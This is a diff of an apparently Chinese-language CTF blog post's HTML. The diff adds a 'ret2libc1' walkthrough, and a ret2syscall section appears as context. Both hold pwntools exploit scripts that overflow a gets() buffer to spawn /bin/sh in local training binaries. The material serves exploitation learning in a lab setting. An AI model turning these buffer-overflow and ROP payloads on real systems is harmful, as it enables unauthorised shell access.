@@ -47,8 +47,13 @@
 <meta property="og:image" content="https://ygkldnherr.github.io/2023/12/05/some-small-pwn-topics/ret2syscall7.png">
 <meta property="og:image" content="https://ygkldnherr.github.io/2023/12/05/some-small-pwn-topics/ret2syscall6.png">
 <meta property="og:image" content="https://ygkldnherr.github.io/2023/12/05/some-small-pwn-topics/ret2syscall8.png">
+<meta property="og:image" content="https://ygkldnherr.github.io/2023/12/05/some-small-pwn-topics/ret2libc10.png">
+<meta property="og:image" content="https://ygkldnherr.github.io/2023/12/05/some-small-pwn-topics/ret2libc11.png">
+<meta property="og:image" content="https://ygkldnherr.github.io/2023/12/05/some-small-pwn-topics/ret2libc12.png">
+<meta property="og:image" content="https://ygkldnherr.github.io/2023/12/05/some-small-pwn-topics/ret2libc13.png">
+<meta property="og:image" content="https://ygkldnherr.github.io/2023/12/05/some-small-pwn-topics/ret2libc14.png">
 <meta property="article:published_time" content="2023-12-05T05:35:58.000Z">
-<meta property="article:modified_time" content="2024-01-24T13:40:07.604Z">
+<meta property="article:modified_time" content="2024-01-28T12:20:29.868Z">
 <meta property="article:author" content="ygkldnherr">
 <meta property="article:tag" content="CTF wp">
 <meta name="twitter:card" content="summary">
@@ -161,7 +166,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-number">1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.</span> <span class="nav-text">ret2syscall</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2text"><span class="nav-number">1.</span> <span class="nav-text">ret2text</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2shellcode"><span class="nav-number">2.</span> <span class="nav-text">ret2shellcode</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2syscall"><span class="nav-number">3.</span> <span class="nav-text">ret2syscall</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ret2libc1"><span class="nav-number">4.</span> <span class="nav-text">ret2libc1</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -242,7 +247,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2024-01-24 21:40:07" itemprop="dateModified" datetime="2024-01-24T21:40:07+08:00">2024-01-24</time>
+      <time title="修改时间：2024-01-28 20:20:29" itemprop="dateModified" datetime="2024-01-28T20:20:29+08:00">2024-01-28</time>
     </span>
 
   
@@ -275,7 +280,7 @@
 <p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall7.png"></p>
 <p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall6.png"></p>
 <p>写exp  </p>
-<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080BE408</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*(<span class="number">108</span> + <span class="number">4</span>), pop_eax, <span class="number">0xb</span>, pop_edx_ecx_ebx, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_80 ])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2syscall"</span>)</span><br><span class="line">pop_eax = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx = <span class="number">0x0806eb90</span></span><br><span class="line">bin_sh = <span class="number">0x080BE408</span></span><br><span class="line">int_80 = <span class="number">0x08049421</span></span><br><span class="line">payload = flat([<span class="string">b'A'</span>*(<span class="number">108</span> + <span class="number">4</span>), pop_eax, <span class="number">0xb</span>, pop_edx_ecx_ebx, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_80 ])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
 
 <p><img src="/2023/12/05/some-small-pwn-topics/ret2syscall8.png"></p>
 <p>打通！</p>
@@ -298,6 +303,13 @@
 <li>字符串本身的内容不适合直接放在ROP链中，因为ROP链需要是一系列的地址。所以我们将字符串的地址放在ROP链中，然后 <code>execve</code> 在执行时会读取该地址处的字符串。</li>
 </ul>
 </blockquote>
+<h1 id="ret2libc1"><a href="#ret2libc1" class="headerlink" title="ret2libc1"></a>ret2libc1</h1><p>checksec<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc10.png"><br>32位程序，未开启canary，未开启PIE，开启了栈不可执行。<br>丢到ida里<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc11.png"><br>发现危险函数gets()<br><img src="/2023/12/05/some-small-pwn-topics/ret2libc12.png"><br>函数secure()有一个system()函数但是命令”shell!?”没有任何作用，但是由于system()函数的调用，在plt表里会有system()函数对应的got表地址的表项，进而能解析出system()函数的真实地址，从而调用system()函数。</p>
+<p><img src="/2023/12/05/some-small-pwn-topics/ret2libc13.png"></p>
+<p>需要填充108 + 4 = 112个垃圾数据<br>写exp  </p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = process(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./ret2libc1"</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">"system"</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b"/bin/sh"</span>))</span><br><span class="line"><span class="comment"># payload = b"a" * 112 + p32(system_addr) + b"aaaa" + p32(bin_sh_addr)</span></span><br><span class="line">payload = flat([<span class="string">b"a"</span>*<span class="number">112</span>, system_addr, <span class="string">b"aaaa"</span>, bin_sh_addr])</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="/2023/12/05/some-small-pwn-topics/ret2libc14.png"></p>
+<p>打通！</p>
 
     </div>
 
